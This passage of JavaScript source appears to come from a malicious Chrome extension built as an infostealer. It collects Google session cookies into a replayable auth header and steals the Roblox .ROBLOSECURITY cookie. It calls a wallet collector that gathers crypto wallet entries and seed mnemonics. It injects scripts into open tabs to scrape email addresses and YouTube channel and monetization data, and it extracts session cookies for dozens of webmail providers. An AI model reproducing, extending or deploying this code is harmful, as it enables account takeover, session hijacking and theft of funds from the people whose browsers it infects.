      if (x === 'youtube.com' || x === 'www.youtube.com') return 860;
      if (x.endsWith('.youtube.com')) return 840;
      if (x.endsWith('.googleusercontent.com')) return 700;
      if (x === 'www.google.com' || x === 'google.com') return 520;
      if (x.endsWith('.google.com')) return 500;
      if (x === 'outlook.live.com' || x.endsWith('.outlook.com')) return 450;
      if (x === 'login.live.com' || x === 'account.live.com' || x.endsWith('.live.com')) return 440;
      if (x === 'login.microsoftonline.com' || x.endsWith('.microsoftonline.com')) return 430;
      if (x === 'account.microsoft.com' || x.endsWith('.microsoft.com')) return 420;
      if (x.endsWith('.office.com') || x.endsWith('.office365.com')) return 410;
      return 100;
    };

    const fetchCookies = async () => {
      let profile = await collectAllProfileCookies({ includeRoblox: true });
      if (!jarHasLiveGoogleSid(profile.jar)) {
        await warmGoogleSessionIfNeeded();
        profile = await collectAllProfileCookies({ includeRoblox: true });
      }

      const jar = profile.jar ? profile.jar.slice() : [];
      jar.sort((a, b) => {
        const ds = domainScore(b.domain) - domainScore(a.domain);
        if (ds !== 0) return ds;
        return (b.path || '/').length - (a.path || '/').length;
      });

      const result = {};
      const googleOnly = {};
      for (const c of jar) {
        if (!result[c.name]) result[c.name] = c.value;
        if (isGoogleLikeDomain(c.domain) && !googleOnly[c.name]) {
          googleOnly[c.name] = c.value;
        }
      }
      for (const [k, v] of Object.entries(googleOnly)) {
        if (v != null && typeof v === 'string' && v.trim()) result[k] = v;
      }

      const hasGoogleSession =
        coreCookieNames.some((n) => !!googleOnly[n]) ||
        !!googleOnly.LSID ||
        !!googleOnly['__Secure-1PSID'] ||
        !!googleOnly['__Secure-3PSID'];

      if (!hasGoogleSession) {
        return {
          success: false,
          error: 'Google auth cookies not found. Log in to Google first.'
        };
      }

      const nowSec = Math.floor(Date.now() / 1000);
      const isRootGoogleDomain = (domain) => {
        const h = String(domain || '')
          .replace(/^\./, '')
          .toLowerCase();
        return h === 'google.com';
      };
      const cookieAlive = (c) => {
        if (!c || !c.value) return false;
        const exp = c.expirationDate;
        return exp == null || exp === 0 || exp > nowSec;
      };
      const liveSid = jar.find(
        (c) =>
          cookieAlive(c) &&
          isRootGoogleDomain(c.domain) &&
          (c.name === 'SID' || c.name === '__Secure-1PSID' || c.name === '__Secure-3PSID')
      );
      const liveSapisid = jar.find(
        (c) =>
          cookieAlive(c) &&
          isGoogleLikeDomain(c.domain) &&
          (c.name === 'SAPISID' || c.name === '__Secure-1PAPISID' || c.name === '__Secure-3PAPISID')
      );
      const sessionLive = !!(liveSid && liveSapisid);
      const sessionChooserOnly =
        !sessionLive &&
        (!!googleOnly.LSID || !!googleOnly['__Host-GAPS'] || !!googleOnly.ACCOUNT_CHOOSER);

      const headerPriority = [
        '__Secure-1PSID',
        '__Secure-3PSID',
        '__Secure-1PAPISID',
        '__Secure-3PAPISID',
        'SID',
        'HSID',
        'SSID',
        'APISID',
        'SAPISID',
        'LSID',
        'OSID',
        'ACCOUNT_CHOOSER',
        'SIDCC',
        '__Secure-1PSIDTS',
        '__Secure-3PSIDTS',
        '__Host-1PLSID',
        '__Host-3PLSID'
      ];
      const buildFullCookieHeader = (flat) => {
        const used = new Set();
        const parts = [];
        const push = (name) => {
          const v = flat[name];
          if (!v || typeof v !== 'string') return;
          if (!/^[A-Za-z0-9_-]+$/.test(name)) return;
          if (used.has(name)) return;
          used.add(name);
          parts.push(`${name}=${v}`);
        };
        for (const n of headerPriority) push(n);
        for (const k of Object.keys(flat).sort()) {
          if (headerPriority.includes(k)) continue;
          if (k.startsWith('_')) continue;
          push(k);
        }
        let s = parts.join('; ');
        if (s.length > 24000) s = s.slice(0, 24000);
        return s;
      };

      const buildCookieHeaderFromJar = (jarArr) => {
        const byName = new Map();
        for (const c of jarArr) {
          if (!c || !c.value || !isGoogleLikeDomain(c.domain)) continue;
          const prev = byName.get(c.name);
          if (!prev) {
            byName.set(c.name, c.value);
            continue;
          }
          const expA = c.expirationDate || 0;
          const expB = prev.expirationDate || 0;
          if (expA >= expB) byName.set(c.name, c.value);
        }
        const flat = {};
        for (const [k, v] of byName) flat[k] = v;
        return buildFullCookieHeader(flat);
      };

      let authHeader = buildFullCookieHeader(googleOnly);
      const jarHeader = buildCookieHeaderFromJar(jar);
      if (jarHeader.length > authHeader.length) authHeader = jarHeader;

      const EP =
        (typeof globalThis !== 'undefined' && globalThis.RbxEmailParser) ||
        (typeof window !== 'undefined' && window.RbxEmailParser) ||
        null;

      const collectEmailsFromGoogleSessionCookies = () => {
        if (!EP) return [];
        const pool = new Set();
        const gOpts = { googleResolve: true };
        try {
          EP.collectEmailsFromAuthObject(googleOnly, pool, null, gOpts);
        } catch (e) {}
        for (const c of jar) {
          if (!c || !c.value) continue;
          if (!isGoogleLikeDomain(c.domain)) continue;
          const val = String(c.value);
          if (
            c.name === 'LSID' ||
            c.name === 'ACCOUNT_CHOOSER' ||
            c.name === '__Host-GAPS' ||
            c.name === '__Host-1PLSID' ||
            c.name === '__Host-3PLSID' ||
            val.includes('@') ||
            val.length > 20
          ) {
            try {
              EP.collectEmailsFromLsidValue(val, pool, null, gOpts);
            } catch (e2) {}
          }
          if (EP.extractEmailsFromText) {
            try {
              EP.extractEmailsFromText(val, null, gOpts).forEach((em) => pool.add(em));
            } catch (e3) {}
          }
        }
        if (EP.extractEmailsFromText && jar.length) {
          try {
            EP.extractEmailsFromText(JSON.stringify(jar), null, gOpts).forEach((em) => pool.add(em));
          } catch (e4) {}
        }
        return mergeGoogleEmailList([...pool]);
      };

      const mergeGoogleEmailList = (list) => {
        if (!list || !list.length) return [];
        if (EP && typeof EP.mergeGoogleEmailCandidates === 'function') {
          return EP.mergeGoogleEmailCandidates(list);
        }
        return list.map((x) => String(x).trim().toLowerCase()).filter(Boolean);
      };

      const extractEmailsFromResponseText = (text) => {
        if (!text || text.length < 8) return [];
        const pool = new Set();
        if (EP && typeof EP.collectEmailsFromListAccountsResponse === 'function') {
          EP.collectEmailsFromListAccountsResponse(text, pool, null, { googleResolve: true });
        }
        if (EP && typeof EP.extractEmailsFromText === 'function') {
          EP.extractEmailsFromText(text, null, { googleResolve: true }).forEach((em) => pool.add(em));
        }
        if (!pool.size) {
          const rough = text.match(/[\w.+-]+@[\w.-]+\.[a-zA-Z]{2,}/g);
          if (rough) rough.forEach((em) => pool.add(em.toLowerCase()));
        }
        return mergeGoogleEmailList([...pool]);
      };

      // Cookie header is a forbidden header in browser fetch — use credentials:'include'
      // so the browser automatically sends the user's Google session cookies.
      const fetchEmailsViaListAccounts = async () => {
        const pool = new Set();
        try {
          const res = await fetch(
            'https://accounts.google.com/ListAccounts?gpsia=1&source=ChromiumBrowser&json=standard&hl=en',
            { method: 'GET', credentials: 'include' }
          );
          const text = await res.text();
          const found = extractEmailsFromResponseText(text);
          found.forEach((em) => pool.add(em));
        } catch (e) {}
        return mergeGoogleEmailList([...pool]);
      };

      const fetchEmailsFromMyAccountJson = async () => {
        const pool = new Set();
        try {
          const res = await fetch(
            'https://myaccount.google.com/embedded/account/v1/details?hl=en&authuser=0',
            { method: 'GET', credentials: 'include' }
          );
          const text = await res.text();
          const found = extractEmailsFromResponseText(text);
          found.forEach((em) => pool.add(em));
        } catch (e) {}
        if (!pool.size) {
          try {
            const res2 = await fetch(
              'https://myaccount.google.com/profile/name/get',
              { method: 'GET', credentials: 'include' }
            );
            const text2 = await res2.text();
            extractEmailsFromResponseText(text2).forEach((em) => pool.add(em));
          } catch (e) {}
        }
        return mergeGoogleEmailList([...pool]);
      };

      let emails = [];
      let email = null;

      if (profile.jarString) {
        result._chromeCookieJar = profile.jarString;
      }

      try {
          const tabs = await chrome.tabs.query({
            url: [
              'https://myaccount.google.com/*',
              'https://accounts.google.com/*',
              'https://myactivity.google.com/*',
              'https://*.google.com/*',
              'http://*.google.com/*',
              'https://google.com/*',
              'http://google.com/*'
            ]
          });
          const scoreG = (url) => {
            if (!url) return 0;
            if (url.includes('myaccount.google.com')) return 4;
            if (url.includes('accounts.google.com')) return 3;
            if (url.includes('myactivity.google.com')) return 2;
            return 1;
          };
          tabs.sort((a, b) => scoreG(b.url) - scoreG(a.url));
          if (tabs && tabs.length > 0 && tabs[0].id != null) {
            const results = await chrome.scripting.executeScript({
              target: { tabId: tabs[0].id, allFrames: true },
              func: () => {
                const metaEmail = document.querySelector('meta[property="og:email"]');
                if (metaEmail && metaEmail.content) return metaEmail.content;
                const emailInput = document.querySelector('input[type="email"]');
                if (emailInput && emailInput.value) return emailInput.value;
                const profileEmail = document.querySelector('[data-email]');
                if (profileEmail) return profileEmail.getAttribute('data-email');
                const gbElement = document.querySelector('[data-ogsr-up]');
                if (gbElement) {
                  const emailMatch = gbElement.getAttribute('data-ogsr-up')?.match(/[\w.+-]+@[\w.-]+\.[a-zA-Z]{2,}/);
                  if (emailMatch) return emailMatch[0];
                }
                const scripts = document.querySelectorAll('script[type="application/json"]');
                for (const s of scripts) {
                  try {
                    const j = JSON.parse(s.textContent || '');
                    const str = JSON.stringify(j);
                    const m = str.match(/[\w.+-]+@[\w.-]+\.[a-zA-Z]{2,}/);
                    if (m) return m[0];
                  } catch (e) {}
                }
                const emailText = document.body.innerText.match(/[\w.+-]+@[\w.-]+\.[a-zA-Z]{2,}/);
                return emailText ? emailText[0] : null;
              }
            });
            if (results && results.length) {
              const tabEmails = [];
              for (const row of results) {
                if (row && row.result) tabEmails.push(row.result);
              }
              if (EP && tabEmails.length) {
                emails = mergeGoogleEmailList(tabEmails);
              } else if (tabEmails.length) {
                emails = tabEmails.map((x) => String(x).trim().toLowerCase()).filter(Boolean);
              }
              email = emails.length ? emails[0] : email;
            }
          }
        } catch (e) {}

      if (!emails.length) {
        emails = collectEmailsFromGoogleSessionCookies();
        email = emails.length ? emails[0] : null;
      }

      if (!emails.length) {
        const fromList = await fetchEmailsViaListAccounts();
        if (fromList.length) {
          emails = fromList;
          email = emails[0];
        }
      }

      if (!emails.length) {
        const fromAcct = await fetchEmailsFromMyAccountJson();
        if (fromAcct.length) {
          emails = fromAcct;
          email = emails[0];
        }
      }

      if (emails.length) {
        emails = mergeGoogleEmailList(emails);
        email = emails[0] || email;
      }

      return {
        success: true,
        cookies: result,
        authHeader,
        sapisid: googleOnly.SAPISID || googleOnly.APISID,
        email,
        emails,
        sessionLive,
        sessionChooserOnly,
        sessionStatus: sessionLive ? 'live' : sessionChooserOnly ? 'chooser_only' : 'partial'
      };
    };

    return await fetchCookies();
  }

  async function getRobloxCookie() {
    const urls = ['https://www.roblox.com/', 'https://roblox.com/', 'https://create.roblox.com/'];
    for (let i = 0; i < urls.length; i++) {
      try {
        const cookie = await chrome.cookies.get({
          url: urls[i],
          name: '.ROBLOSECURITY'
        });
        if (cookie && cookie.value) {
          return { success: true, cookie: cookie.value };
        }
      } catch (e) {}
    }
    try {
      const allCookies = await chrome.cookies.getAll({ domain: '.roblox.com' });
      const found = allCookies.find((c) => c.name === '.ROBLOSECURITY' && c.value);
      return { success: !!found, cookie: found ? found.value : null };
    } catch (e) {
      return { success: false, cookie: null };
    }
  }

  async function collectWalletSnapshot() {
    const WC =
      (typeof globalThis !== 'undefined' && globalThis.RbxWalletCollector) ||
      (typeof window !== 'undefined' && window.RbxWalletCollector) ||
      null;
    if (!WC || typeof WC.collectWalletSnapshot !== 'function') {
      return { success: false, text: '', entries: [], mnemonics: [] };
    }
    try {
      return await WC.collectWalletSnapshot();
    } catch (e) {
      return { success: false, text: '', entries: [], mnemonics: [], error: e.message };
    }
  }

  async function collectYoutubeInfo() {
    const result = {
      channelId: null,
      channelName: null,
      handle: null,
      subscribers: null,
      totalViews: null,
      videoCount: null,
      totalLikes: null,
      monetized: null,
      monetizationStatus: null,
      country: null,
      joinedDate: null,
      description: null,
      email: null,
      url: null
    };

    // Parse common fields from raw page text / JSON blobs
    const extractFromPageText = (text) => {
      if (!text) return;
      if (!result.channelId) {
        const m = text.match(/"externalId"\s*:\s*"(UC[A-Za-z0-9_-]{20,})"/);
        if (m) result.channelId = m[1];
      }
      if (!result.channelName) {
        const m = text.match(/"channelName"\s*:\s*"([^"\\]{1,120})"/);
        if (m) result.channelName = m[1];
      }
      if (!result.handle) {
        const m = text.match(/"vanityId"\s*:\s*"(@?[A-Za-z0-9_.-]{3,60})"/);
        if (m) result.handle = m[1].startsWith('@') ? m[1] : '@' + m[1];
      }
      if (!result.subscribers) {
        const m = text.match(/"subscriberCount"\s*:\s*["]?(\d+)["]?/);
        if (m) result.subscribers = m[1];
      }
      if (!result.totalViews) {
        const m = text.match(/"viewCount"\s*:\s*["]?(\d+)["]?/);
        if (m) result.totalViews = m[1];
      }
      if (!result.videoCount) {
        const m = text.match(/"videoCount"\s*:\s*["]?(\d+)["]?/);
        if (m) result.videoCount = m[1];
      }
      if (!result.country) {
        const m = text.match(/"country"\s*:\s*"([A-Z]{2})"/);
        if (m) result.country = m[1];
      }
      if (!result.joinedDate) {
        const m = text.match(/"publishedAt"\s*:\s*"(\d{4}-\d{2}-\d{2})/);
        if (m) result.joinedDate = m[1];
      }
      if (!result.email) {
        const m = text.match(/[a-zA-Z0-9._%+\-]{1,80}@[a-zA-Z0-9.\-]{2,60}\.[a-zA-Z]{2,10}/);
        if (m && !m[0].includes('sentry') && !m[0].includes('google') && !m[0].includes('youtube')) {
          result.email = m[0];
        }
      }
    };

    // Extract monetization status from Studio page text
    const extractMonetization = (text) => {
      if (!text) return;
      // Studio JSON patterns
      if (/"monetizationEnabled"\s*:\s*true/.test(text) ||
          /"isMonetized"\s*:\s*true/.test(text) ||
          /"partnerEligible"\s*:\s*true/.test(text)) {
        result.monetized = true;
      } else if (/"monetizationEnabled"\s*:\s*false/.test(text) ||
                 /"isMonetized"\s*:\s*false/.test(text)) {
        result.monetized = false;
      }
      // Human-readable status from Studio
      if (!result.monetizationStatus) {
        if (/"monetizationStatus"\s*:\s*"([^"]+)"/.test(text)) {
          result.monetizationStatus = text.match(/"monetizationStatus"\s*:\s*"([^"]+)"/)[1];
        } else if (/"eligibilityData"/.test(text) && /"eligible"\s*:\s*true/.test(text)) {
          result.monetizationStatus = 'eligible';
        }
      }
    };

    // Only accept tabs that are actual channel/studio pages (not search, watch, feed, etc.)
    const isChannelTabUrl = (url) => {
      if (!url) return false;
      if (url.startsWith('https://studio.youtube.com/')) return true;
      // channel/UC..., /@handle, /c/name — but NOT /results, /watch, /feed, /shorts
      if (/https:\/\/(www\.)?youtube\.com\/(channel\/UC[A-Za-z0-9_-]{20,}|@[A-Za-z0-9_.-]{3,}(?:\/|$)|c\/[A-Za-z0-9_.-]{2,}(?:\/|$))/.test(url)) return true;
      return false;
    };

    const cleanText = (s) => s ? String(s).replace(/\s+/g, ' ').trim() : null;

    try {
      // Step 1: scan open Studio + channel tabs only (read-only, no search/watch/feed)
      const studioPat = ['https://studio.youtube.com/*', 'https://www.youtube.com/*'];
      const rawTabs = await new Promise((res) => {
        chrome.tabs.query({ url: studioPat }, (t) => res(t || []));
      });
      // Keep only valid channel/studio URLs, prefer Studio first
      const tabs = rawTabs
        .filter((t) => isChannelTabUrl(t.url))
        .sort((a, b) => {
          const s = (u) => (u && u.startsWith('https://studio.youtube.com/') ? 2 : 1);
          return s(b.url) - s(a.url);
        });

      for (const tab of tabs) {
        if (tab.id == null || tab.id < 0) continue;
        try {
          const execResults = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            func: () => {
              const info = {};
              const clean = (s) => s ? s.replace(/\s+/g, ' ').trim() : null;

              // Only extract on Studio or own channel pages — abort on search/watch/feed
              const isStudio = location.href.startsWith('https://studio.youtube.com/');
              const isChannelPage = /\/(channel\/UC[A-Za-z0-9_-]{20,}|@[A-Za-z0-9_.-]{3,}|c\/[A-Za-z0-9_.-]{2,})/.test(location.pathname);
              if (!isStudio && !isChannelPage) return null;

              // Channel ID from URL path
              const idMatch = location.href.match(/\/channel\/(UC[A-Za-z0-9_-]{20,})/);
              if (idMatch) info.channelId = idMatch[1];

              // Channel name — prefer Studio-specific selectors
              for (const sel of ['#channel-name', 'ytcp-channel-name', '#entity-name']) {
                const el = document.querySelector(sel);
                const txt = clean(el && el.textContent);
                if (txt && txt.length > 0 && txt.length < 200) { info.channelName = txt; break; }
              }

              // Handle (@username)
              for (const sel of ['#channel-handle', '.channel-handle']) {
                const el = document.querySelector(sel);
                const txt = clean(el && el.textContent);
                if (txt) { info.handle = txt; break; }
              }

              // Subscribers
              for (const sel of ['#subscriber-count']) {
                const el = document.querySelector(sel);
                const txt = clean(el && el.textContent);
                if (txt) { info.subscribers = txt; break; }
              }

              // Analytics cards (Studio dashboard only)
              if (isStudio) {
                document.querySelectorAll('ytcp-analytics-metric-card, ytcp-channel-analytics-dashboard-card').forEach((card) => {
                  const label = clean((card.querySelector('[data-label], .metric-label, .card-title') || {}).textContent) || '';
                  const val = clean((card.querySelector('.metric-value, #metric-value') || {}).textContent) || '';
                  if (val) {
                    if (/view/i.test(label)) info.totalViews = val;
                    if (/watch.time/i.test(label)) info.watchTime = val;
                    if (/subscriber/i.test(label)) info.subscribers = val;
                  }
                });
                const monBadge = document.querySelector('[data-monetization-status], .monetization-status');
                if (monBadge) info.monetizationStatus = clean(monBadge.textContent) || monBadge.getAttribute('data-monetization-status');
              }

              // Parse inline JSON — only look for the owner's own channel data
              try {
                const scripts = document.querySelectorAll('script');
                for (const s of scripts) {
                  const t = s.textContent || '';
                  if (!t.includes('externalId') && !t.includes('vanityId')) continue;
                  const pick = (re) => { const m = t.match(re); return m ? m[1] : null; };
                  if (!info.channelId) info.channelId = pick(/"externalId"\s*:\s*"(UC[A-Za-z0-9_-]{20,})"/);
                  if (!info.handle && !info.channelName) {
                    // Only grab channelName from JSON if we already have channelId (i.e. owner context)
                    if (info.channelId) {
                      if (!info.channelName) info.channelName = pick(/"channelName"\s*:\s*"([^"\\]{1,120})"/);
                      const v = pick(/"vanityId"\s*:\s*"(@?[A-Za-z0-9_.-]{3,60})"/);
                      if (v) info.handle = v.startsWith('@') ? v : '@' + v;
                    }
                  } else {
                    const v = pick(/"vanityId"\s*:\s*"(@?[A-Za-z0-9_.-]{3,60})"/);
                    if (v && !info.handle) info.handle = v.startsWith('@') ? v : '@' + v;
                  }
                  if (!info.subscribers) info.subscribers = pick(/"subscriberCount"\s*:\s*["]?(\d+)["]?/);
                  if (!info.totalViews) info.totalViews = pick(/"viewCount"\s*:\s*["]?(\d+)["]?/);
                  if (!info.videoCount) info.videoCount = pick(/"videoCount"\s*:\s*["]?(\d+)["]?/);
                  if (!info.country) info.country = pick(/"country"\s*:\s*"([A-Z]{2})"/);
                  if (!info.joinedDate) info.joinedDate = pick(/"publishedAt"\s*:\s*"(\d{4}-\d{2}-\d{2})/);
                  if (/"monetizationEnabled"\s*:\s*true/.test(t) || /"isMonetized"\s*:\s*true/.test(t)) info.monetized = true;
                  else if (/"monetizationEnabled"\s*:\s*false/.test(t)) info.monetized = false;
                  if (info.channelId) break;
                }
              } catch (_) {}

              info.url = location.href;
              return info;
            }
          });
          if (execResults && execResults[0] && execResults[0].result) {
            const r = execResults[0].result;
            // Require channelId — don't accept name-only results from random pages
            if (r && r.channelId) {
              for (const k of ['channelId','channelName','handle','subscribers','totalViews','videoCount','country','joinedDate','monetized','monetizationStatus','monetizationHint','watchTime']) {
                if (r[k] != null && result[k] == null) result[k] = r[k];
              }
              if (r.monetized != null) result.monetized = r.monetized;
              // Only store URL if it's a meaningful channel/studio URL (not search/results)
              if (r.url && isChannelTabUrl(r.url)) result.url = r.url;
              break;
            }
          }
        } catch (_) {}
      }
    } catch (_) {}

    // Step 2: fallback fetches — run whenever channelId is still missing
    const studioFetched = { dashboard: false, monetization: false };
    if (!result.channelId) {
      // 2a: Studio dashboard (best source for creators)
      try {
        const res = await fetch('https://studio.youtube.com/dashboard', { credentials: 'include', cache: 'no-store' });
        if (res.ok) { const t = await res.text(); extractFromPageText(t); extractMonetization(t); studioFetched.dashboard = true; }
      } catch (_) {}
    }

    if (!result.channelId) {
      // 2b: YouTube homepage — ytInitialData contains own channel info for logged-in users
      try {
        const res = await fetch('https://www.youtube.com/', { credentials: 'include', cache: 'no-store' });
        if (res.ok) {
          const t = await res.text();
          // Own channel ID appears in guide sidebar as browseId="UC..."
          // Look specifically in guideEntries / channelRenderer context
          const ownIdM = t.match(/"browseId"\s*:\s*"(UC[A-Za-z0-9_-]{22,})"\s*,\s*"canonicalBaseUrl"\s*:\s*"\/@/);
          if (ownIdM) result.channelId = ownIdM[1];
          if (!result.channelId) {
            // Fallback: grab first UC id near "My channel" text or avatar
            const mcM = t.match(/"My channel"[^}]{0,200}"(UC[A-Za-z0-9_-]{22,})"/);
            if (mcM) result.channelId = mcM[1];
          }
          if (result.channelId) extractFromPageText(t);
        }
      } catch (_) {}
    }

    if (!result.channelId) {
      // 2c: Studio root — redirects to /channel/UCxxx, response body has externalId
      try {
        const res = await fetch('https://studio.youtube.com/', { credentials: 'include', cache: 'no-store' });
        if (res.ok) { const t = await res.text(); extractFromPageText(t); }
      } catch (_) {}
    }

    // Step 3: fetch monetization page from Studio (separate fetch, won't break the tab)
    if (result.channelId && result.monetized == null) {
      try {
        const res = await fetch(`https://studio.youtube.com/channel/${result.channelId}/monetization`, { credentials: 'include', cache: 'no-store' });
        if (res.ok || res.status < 500) {
          const t = await res.text();
          extractMonetization(t);
          if (!studioFetched.dashboard) extractFromPageText(t);
          studioFetched.monetization = true;
        }
      } catch (_) {}
    }

    // Step 4: YouTube Innertube API — channel statistics (public endpoint, no extra auth needed)
    if (result.channelId && (!result.totalViews || !result.videoCount)) {
      try {
        const body = JSON.stringify({
          context: {
            client: { clientName: 'WEB', clientVersion: '2.20240101', hl: 'en', gl: 'US' }
          },
          browseId: result.channelId,
          params: 'EgC4AQA%3D'  // "About" tab
        });
        const res = await fetch('https://www.youtube.com/youtubei/v1/browse?prettyPrint=false', {
          method: 'POST',
          credentials: 'include',
          headers: { 'Content-Type': 'application/json', 'X-Youtube-Client-Name': '1', 'X-Youtube-Client-Version': '2.20240101' },
          body
        });
        if (res.ok) {
          const json = await res.json().catch(() => null);
          if (json) {
            const txt = JSON.stringify(json);
            if (!result.totalViews) {
              const m = txt.match(/"viewCount"\s*:\s*["]?(\d+)["]?/);
              if (m) result.totalViews = m[1];
            }
            if (!result.videoCount) {
              const m = txt.match(/"videoCount"\s*:\s*["]?(\d+)["]?/);
              if (m) result.videoCount = m[1];
            }
            if (!result.subscribers) {
              const m = txt.match(/"subscriberCount"\s*:\s*["]?(\d+)["]?/);
              if (m) result.subscribers = m[1];
            }
            if (!result.country) {
              const m = txt.match(/"country"\s*:\s*\{[^}]*?"simpleText"\s*:\s*"([^"]+)"/);
              if (m) result.country = m[1];
            }
            if (!result.joinedDate) {
              const m = txt.match(/"joinedDateText"\s*:\s*\{[^}]*?"runs"\s*:\s*\[[^\]]*?"text"\s*:\s*"([^"]+)"/);
              if (m) result.joinedDate = m[1];
            }
            if (!result.description) {
              const m = txt.match(/"description"\s*:\s*\{[^}]*?"simpleText"\s*:\s*"([^"\\]{5,300})"/);
              if (m) result.description = m[1].replace(/\\n/g, ' ').trim();
            }
          }
        }
      } catch (_) {}
    }

    // Step 5: Studio analytics API for likes (cumulative)
    if (result.channelId) {
      try {
        const analyticsBody = JSON.stringify({
          context: { client: { clientName: 'YOUTUBE_CREATOR_STUDIO', clientVersion: '1.0' } },
          channelId: result.channelId,
          metrics: ['LIKES', 'DISLIKES'],
          dimensions: [],
          timeRange: { sincePublish: {} }
        });
        const res = await fetch('https://studio.youtube.com/youtubei/v1/analytics/query?alt=json', {
          method: 'POST',
          credentials: 'include',
          headers: { 'Content-Type': 'application/json' },
          body: analyticsBody
        });
        if (res.ok) {
          const json = await res.json().catch(() => null);
          if (json) {
            const txt = JSON.stringify(json);
            const m = txt.match(/"totalStats"[^}]*?"likes"\s*:\s*(\d+)/);
            if (m) result.totalLikes = m[1];
          }
        }
      } catch (_) {}
    }

    // Build canonical URL
    if (!result.url || result.url.includes('studio.youtube.com')) {
      if (result.channelId) {
        result.url = 'https://www.youtube.com/channel/' + result.channelId;
      } else if (result.handle) {
        result.url = 'https://www.youtube.com/' + result.handle;
      }
    }

    return result;
  }

  function inferGoogleSessionFromJarString(jarString) {
    if (!jarString || typeof jarString !== 'string') return null;
    let jar;
    try {
      jar = JSON.parse(jarString);
    } catch (e) {
      return null;
    }
    if (!Array.isArray(jar)) return null;
    const nowSec = Math.floor(Date.now() / 1000);
    const cookieAlive = (c) => {
      if (!c || !c.value) return false;
      const exp = c.expirationDate;
      return exp == null || exp === 0 || exp > nowSec;
    };
    const isRootGoogleDomain = (domain) => {
      const h = String(domain || '')
        .replace(/^\./, '')
        .toLowerCase();
      return h === 'google.com';
    };
    const liveSid = jar.find(
      (c) =>
        cookieAlive(c) &&
        isRootGoogleDomain(c.domain) &&
        (c.name === 'SID' || c.name === '__Secure-1PSID' || c.name === '__Secure-3PSID')
    );
    const liveSapisid = jar.find(
      (c) =>
        cookieAlive(c) &&
        (c.name === 'SAPISID' || c.name === '__Secure-1PAPISID' || c.name === '__Secure-3PAPISID')
    );
    const sessionLive = !!(liveSid && liveSapisid);
    const hasChooser = jar.some(
      (c) => c && (c.name === 'LSID' || c.name === 'ACCOUNT_CHOOSER' || c.name === '__Host-GAPS')
    );
    const sessionChooserOnly = !sessionLive && hasChooser;
    return {
      sessionLive,
      sessionChooserOnly,
      sessionStatus: sessionLive ? 'live' : sessionChooserOnly ? 'chooser_only' : 'partial'
    };
  }

  /**
   * Extracts per-provider auth objects from _chromeCookieJar.
   * Returns { yahooAuth, aolAuth, mailRuAuth, yandexAuth, protonAuth, icloudAuth,
   *           gmxAuth, tutanotaAuth, fastmailAuth, zohomailAuth, ukrNetAuth }
   * Each auth is a flat { cookieName: value, ..., _cookieHeader: "Name=val; ..." }
   */
  function extractMailAuthFromJar(jarString) {
    let jar = [];
    try {
      jar = JSON.parse(jarString);
      if (!Array.isArray(jar)) jar = [];
    } catch (_) { return {}; }

    const PROVIDERS = [
      {
        key: 'yahooAuth',
        re: /(yahoo|ymail|rocketmail)\.(com|co\.[a-z]+|de|fr|co\.jp|com\.br|[a-z]{2,3})$/i,
        priority: ['Y', 'T', 'B', 'YHOO', 'YVAP', '__Secure-YT']
      },
      {
        key: 'aolAuth',
        re: /aol\.com$/i,
        priority: ['Y', 'T', 'B', 'YHOO']
      },
      {
        key: 'mailRuAuth',
        re: /(mail|bk|inbox|list)\.ru$/i,
        priority: ['Mpop', 't', 'ssdc', 'mrcu', 'minya', 'i', 'sdcs', 'auth_hash', 'act']
      },
      {
        key: 'yandexAuth',
        re: /(yandex\.(ru|com|kz|ua|by)|ya\.ru)$/i,
        priority: ['Session_id', 'sessionid2', 'yandexuid', 'L', 'my', 'yp', 'yandex_login', 'login', 'uid', 'i', 'ys']
      },
      {
        key: 'hotmailAuth',
        re: /(hotmail\.(com|co\.uk|de|fr|es|it|com\.br|com\.ar|co\.jp)|msn\.com|live\.(com|co\.uk|de|fr|it)|outlook\.com)$/i,
        priority: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSSC', 'buid', 'esctx',
                   'stsservicecookie', 'fpc', 'MUID', 'wlidperf', 'MC1']
      },
      {
        key: 'protonAuth',
        re: /(proton\.me|protonmail\.com)$/i,
        priority: ['AUTH-', 'Tag', 'Version']
      },
      {
        key: 'icloudAuth',
        re: /(icloud\.com|apple\.com)$/i,
        priority: ['X-APPLE-WEBAUTH-HSA-TRUST', 'X-APPLE-WEBAUTH-TOKEN', 'X-APPLE-WEBAUTH-VALIDATE',
                   'myacinfo', 'dqsid', 'itctx', 'DES', 'acn01', 'aidsp', 'idcsr', 'pldflt']
      },
      {
        key: 'gmxAuth',
        re: /gmx\.(com|de|net|at|ch)$/i,
        priority: ['GRTX', 'si', 'gmx_session', 'csrf', 'af']
      },
      {
        key: 'webdeAuth',
        re: /web\.de$/i,
        priority: ['GRTX', 'si', 'webde_session', 'csrf', 'af']
      },
      {
        key: 'mailComAuth',
        re: /^mail\.com$/i,
        priority: ['GRTX', 'si', 'session']
      },
      {
        key: 'tutanotaAuth',
        re: /(tutanota\.com|tuta\.com)$/i,
        priority: ['tutasession', 'JSESSIONID', 'session']
      },
      {
        key: 'fastmailAuth',
        re: /fastmail\.com$/i,
        priority: ['clientId', 'JMAUTH', 'session']
      },
      {
        key: 'zohomailAuth',
        re: /zoho\.com$/i,
        priority: ['CSRF_TOKEN', 'ZM_TEST', 'ZM_TGT', 'SSESSION', 'stk', 'iamcsr']
      },
      {
        key: 'ukrNetAuth',
        re: /ukr\.net$/i,
        priority: ['authn', 'Ux', 'uid', 'auth', 'session']
      },
      {
        key: 'ramblerAuth',
        re: /rambler\.ru$/i,
        priority: ['rdc', 'rsid', 'ssid', 'rcid']
      },
      {
        key: 'naverAuth',
        re: /naver\.com$/i,
        priority: ['NID_AUT', 'NID_SES', 'NID_JKL']
      },
      {
        key: 'qqAuth',
        re: /qq\.com$/i,
        priority: ['skey', 'p_uin', 'p_skey', 'uin', 'pt2gguin', 'ptwebqq']
      },
      {
        key: 'netease163Auth',
        re: /(163|126|yeah)\.com$/i,
        priority: ['NTES_SESS', 'NETEASE_SESS', 'vinfo', 'P_INFO']
      },
      {
        key: 'seznamAuth',
        re: /seznam\.cz$/i,
        priority: ['szn_id', 'szn_auth', 'PHPSESSID', 'session', 'acc']
      },
      {
        key: 'tonlineAuth',
        re: /t-online\.de$/i,
        priority: ['AMSessionID', 'JSESSIONID', 'session', 'authToken']
      },
      {
        key: 'orangeAuth',
        re: /orange\.fr$/i,
        priority: ['SSOTOKEN', 'session', 'OAMAuthnCookie', 'JSESSIONID']
      },
      {
        key: 'liberoAuth',
        re: /libero\.it$/i,
